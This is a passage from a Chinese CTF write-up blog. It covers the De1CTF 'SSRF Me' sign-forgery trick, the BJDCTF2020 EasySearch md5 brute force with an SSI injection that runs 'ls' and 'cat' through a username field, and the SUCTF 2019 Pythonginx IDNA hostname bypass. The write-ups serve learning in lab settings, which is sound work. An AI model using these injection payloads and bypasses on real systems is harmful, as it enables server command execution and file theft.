class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#获取HTTP请求中名为&quot;param&quot;的参数的值,如果找不到就返回空字符串</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#后面那个&quot;&quot;意思是要是没值就赋空</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> waf(param):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>] <span class="hljs-comment">## 打开指定URL并读取前50个字符的内容。不过注意这东西并没有输出。</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest() <span class="hljs-comment">#计算哈希并转换成16进制</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#先去首位空格再转换成小写</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#如果变量check以这两个开头</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br><br><br><br></code></pre></td></tr></table></figure><p>这道题刚拿到的时候人晕了。。不知怎么下手，跟着这位师傅的思路做了一下：<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><p>一共三个路由：<code>/</code>,<code>/De1ta</code>,<code>/geneSign</code>，先看接受一堆参数的<code>/De1ta</code>路由都拿参数干了啥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>)) <span class="hljs-comment">#利用cookie传action的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#get传param，要是没有直接赋值为空</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>)) <span class="hljs-comment">#利用cookie传sign的值</span><br></code></pre></td></tr></table></figure><p>接受到的<code>param</code>带入到<code>waf</code>函数里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> waf(param):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br></code></pre></td></tr></table></figure><p>看看<code>waf</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower() <span class="hljs-comment">#先去首位空格再转换成小写</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>): <span class="hljs-comment">#如果变量check以这两个开头</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>然后构造一个<code>Task</code>类对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">task = Task(action, param, sign, ip) <span class="hljs-comment">#注意在python中实例化一个类不需要 new,但java和php需要</span><br><span class="hljs-keyword">return</span> json.dumps(task.Exec()) <span class="hljs-comment">#将task.Exec()的返回值转换为JSON格式的字符串</span><br></code></pre></td></tr></table></figure><p>看下<code>Exec</code>这个方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>      result = &#123;&#125;<span class="hljs-comment"># 创建空字典</span><br>      result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span> <br>      <span class="hljs-keyword">if</span> self.checkSign(): <br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>              tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#%s是一个占位符，将被self.sandbox的值替换</span><br>              resp = scan(self.param) <span class="hljs-comment">#注意这个函数，提示flag in ./flag.txt，那我们可以通过scan去读该文件前50个字符，对于flag来说肯定够用了，但仅有scan并不能把结果输出)</span><br>              <span class="hljs-keyword">if</span> resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>:<br>                  result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>              <span class="hljs-keyword">else</span>:<br>                  <span class="hljs-built_in">print</span> resp<br>                  tmpfile.write(resp)<br>                  tmpfile.close()<br>                  result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>          <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action: <span class="hljs-comment">#scan和read组合使用，一写一读</span><br>              f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>              result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>          <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>              result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>      <span class="hljs-keyword">else</span>:<br>          result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>          result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>      <span class="hljs-keyword">return</span> result <br></code></pre></td></tr></table></figure><p>他先检查了<code>checkSign</code>是否为真：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">  <span class="hljs-comment">#checkSign</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># 当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true</span><br>       <span class="hljs-keyword">if</span> getSign(self.action, self.param) == self.sign:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  <span class="hljs-comment"># getSign</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>): <span class="hljs-comment"># 三个参数拼接然后md5</span><br>   <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>然后是<code>/geneSign</code>路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#路由</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)) <span class="hljs-comment">#获取HTTP请求中名为&quot;param&quot;的参数的值,如果找不到就返回空字符串</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br></code></pre></td></tr></table></figure><p>其实梳理完代码思路就比较清晰了，我们最终的目标是把<code>./flag.txt</code>的内容读出来 -&gt;可以通过<code>Exec()</code>实现 - &gt;实现<code>Exec()</code>需要满足<code>self.checkSign()</code>和<code>&quot;scan&quot; in self.action &amp;&quot;read&quot; in self.action</code>同时为真。</p><p>首先是<code>checkSign</code>，如果满足<code>hashlib.md5(secert_key + param + action).hexdigest()</code> &#x3D;&#x3D;<code>self.sign</code> 才会<code>return ture</code>。我们知道<code>sign、action</code>是通过<code>cookie</code>传过来的,<code>param</code>是利用<code>GET</code>方法传过来的。但仅剩的这个<code>secret_key</code>我们并不知道。</p><p>这时可以利用<code>/geneSign</code>这个路由，他可以返回<code>hashlib.md5(secert_key + param + scan).hexdigest()</code>(注意他的<code>action</code>事先定义好了，没法修改)。</p><p>如果我们访问<code>/geneSign?param=flag.txt</code>，那么返回的字符串会是：<code>md5(secret_key+flag.txt+scan)</code>：<code>d7d0f6d0bb268048ca879fc3f180c36d</code></p><p>如果我们访问<code>/geneSign?param=flag.txtread</code>，那么返回的字符串会是：</p><p><code>md5(secret_key+flag.txtread+scan)</code>: <code>50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p>那这东西不就是我们需要的<code>sign</code>值吗？</p><p>抓个包修改<code>Cookie:action=readscan;sign=50ba0e9dcf745a4ec74863a4f15eeabc</code></p><p><img src="/img/SSRFME2.png" alt="SSRFME2"></p><p>参考文章<code>https://www.cnblogs.com/zzjdbk/p/13685940.html</code></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>一个登录界面，没发现什么提示</p><p><img src="/img/easysearch1.png" alt="easysearch1"></p><p><code>username</code>和<code>password</code>是以<code>POST</code>形式提交的，未经过任何加密：</p><p><img src="/img/easysearch2.png" alt="easysearch2"></p><p>试了试感觉不是SQL注入，题目<code>EasySearch</code>,用<code>dirsearch</code>扫一下？</p><p>没扫出来，用御剑扫还是没扫出来。。后来直接去看了<code>wp</code>。。。</p><p><code>/index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123; <span class="hljs-comment">//取密码加密后的前六位与$admin比较，假如相等则</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先找<code>md5</code>加密后前六位是<code>6d0bc1</code>的字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helloworld</span>(<span class="hljs-params">target</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>       <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == target:<span class="hljs-comment">#哈希操作前必须先对字符串编码</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <br>target = <span class="hljs-string">&#x27;6d0bc1&#x27;</span><br>helloworld(target)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br><span class="hljs-number">2020666</span><br><span class="hljs-number">2305004</span><br><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>用户名任意，随便选个符合条件的密码，登陆后界面啥也没有，去看看包头：</p><p><img src="/img/easysearch3.png" alt="easysearch3"></p><p><code>Url_is_here:public/08ce2e9aef0f551307554f2c1b21d8271ffbcd87.shtml</code>,访问：</p><p><img src="/img/easysearch5.png" alt="easysearch5"></p><p>可以看到他把用户名显示出来了，师傅们的<code>wp</code>中说这东西叫<code>SSI注入</code>：</p><p><code>SSI</code>:</p><p><img src="/img/SSI1.png" alt="SSI1"></p><p>可以看到要包含的东西是用户可控的。</p><p><code>shtml</code>：</p><p><img src="/img/SSI2.png" alt="SSI2"></p><p><code>shtml文件可以在服务端执行一些指令</code></p><p><img src="/img/SSI3.png" alt="SSI3"></p><p><code>Web</code>服务器开启了<code>SSI</code>功能 - &gt;用户通过构造恶意<code>SSI</code>指令执行某些操作 - &gt; 执行命令并形成<code>shtml</code>文件</p><p>我们可以控制<code>username</code>和<code>password</code>，<code>username</code>有回显而且<code>password</code>是固定的，通过调整<code>username</code>的值来进行<code>SSI注入</code>：把<code>username</code>改成<code>&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</code>再访问：</p><p><img src="/img/easysearch6.png" alt="easysearch6"></p><p>然后改成<code>&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code>就行</p><p><code>flag&#123;60f16b0b-40d8-4be2-a7f0-96dd2d99e7d6&#125;</code></p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/img/nigix1.png" alt="nigix1"></p><p>源码中的提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="hljs-comment">&lt;!-- Do you know the nginx? --&gt;</span><br></code></pre></td></tr></table></figure><p>梳理一下这段代码： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urlsplit, urlunsplit<br><span class="hljs-keyword">import</span> urllib.request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = urlparse(url).hostname <span class="hljs-comment"># urlparse是Python标准库中的一个函数，位于urllib.parse模块中。它用于解析URL字符串，将其拆分为多个部分，包括协议、主机名、路径、查询参数等。他会把目标url中的主机名解析出来赋值给host</span><br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span><br>    <br>    parts = <span class="hljs-built_in">list</span>(urlsplit(url))  <span class="hljs-comment">#urlsplit(url)函数会将URL字符串解析为多个部分，包括协议、主机名、路径、查询参数等，并返回一个namedtuple对象。然后通过list()函数将namedtuple对象转换为列表，存储在名为&quot;parts&quot;的变量中</span><br>    host = parts[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    <br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-comment"># 注意这个</span><br>    <br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#将列表newhost中的元素使用&#x27;.&#x27;连接成一个字符串</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># 经过urlunsplit函数处理后的parts重新拼接成一个URL，并且使用空格将其分割成一个字符串列表，然后取列表中的第一个元素赋值给finalUrl变量</span><br>    host = urlparse(finalUrl).hostname<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="hljs-comment"># 打开finalUrl对应的URL，然后使用read()方法来读取该URL的内容。最后，使用return语句将读取的内容返回。</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>URL</code>的一般格式：</p><p><code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p><p>常见的协议有<code>http</code>,<code>https</code>,<code>ftp</code>以及<code>file</code>。其中FIle协议也叫<strong>本地文件传输协议</strong> ，主要用于访问本地计算机中的文件。格式：<strong>file:&#x2F;&#x2F;&#x2F;文件路径</strong>。比如：<code>file:///D:/mywebproject/bigwatermelon/index.html</code></p><p>可以看到<code>url</code>经过处理后进行了三次<code>if</code>条件的判断，前两次判断<code> if host == &#39;suctf.cc&#39;</code>，如果返回<code>true</code>就直接  <code> return    xxxxx</code>,如果第三次<code>if  host == &#39;suctf.cc&#39;</code> ，这时会返回指定<code>url</code>的内容。</p><p>这么看似乎是矛盾的，不过第三次判断前进行了<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>处理。解题思路就是寻找一个特定的<code>URL</code>,他经过前两次解析后<code>host != scctf.cc</code>但经过编码后满足<code>host == suctf.cc</code></p><p> <code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code> 进行了规范化, 会把某些特殊的 Unicode 字符规范化为正常的 ASCII 字符。那我们需要找到一些 unicode 字符绕过前两个 if 的检测, 并且在进行规范化之后通过第三个 if 的判断。</p><p><code>IDNA编码通常用于将域名中的非ASCII字符转换为ASCII兼容格式</code></p><p>然后就是找某个<code>unicode</code>让他规范化之前<code>不正常</code>但是规范化后<code>正常</code>。这里参考了<code>mochu</code>师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 